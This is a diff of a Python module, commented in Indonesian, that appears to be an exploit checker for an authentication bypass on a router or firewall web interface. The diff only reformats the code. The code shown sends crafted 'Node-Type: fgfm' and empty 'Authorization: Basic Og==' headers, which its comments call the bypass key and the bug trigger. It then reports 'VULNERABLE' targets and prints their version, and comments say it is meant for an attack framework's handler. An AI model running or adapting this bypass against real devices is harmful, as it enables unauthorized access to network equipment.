@@ -4,9 +4,8 @@ import urllib3
 # Mematikan peringatan SSL karena biasanya router pakai sertifikat self-signed
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-REQUIRED_OPTIONS = {
-        "URL": ""
-}
+REQUIRED_OPTIONS = {"URL": ""}
+
 
 def execute(options):
 
@@ -23,8 +22,8 @@ def execute(options):
     headers = {
         "User-Agent": "Mozilla/5.0",
         "Node-Id": "1",
-        "Node-Type": "fgfm", # Ini kunci bypassnya
-        "Authorization": "Basic Og==" # Payload kosong yang memicu bug
+        "Node-Type": "fgfm",  # Ini kunci bypassnya
+        "Authorization": "Basic Og==",  # Payload kosong yang memicu bug
     }
 
     try:
@@ -34,7 +33,9 @@ def execute(options):
         if response.status_code == 200 and "version" in response.text.lower():
             print(f"{'='*40}")
             print(f"[!] VULNERABLE: {target}")
-            print(f"[+] System Info: {response.json().get('results', {}).get('version', 'N/A')}")
+            print(
+                f"[+] System Info: {response.json().get('results', {}).get('version', 'N/A')}"
+            )
             print(f"{'='*40}")
         else:
             print("[-] Target not vulnerable or patched.")
@@ -42,8 +43,10 @@ def execute(options):
     except Exception as e:
         print(f"[-] Error connecting: {e}")
 
+
 # Agar bisa dipanggil oleh handler Storm kamu
 if __name__ == "__main__":
     import sys
+
     if len(sys.argv) > 1:
         execute(sys.argv[1])
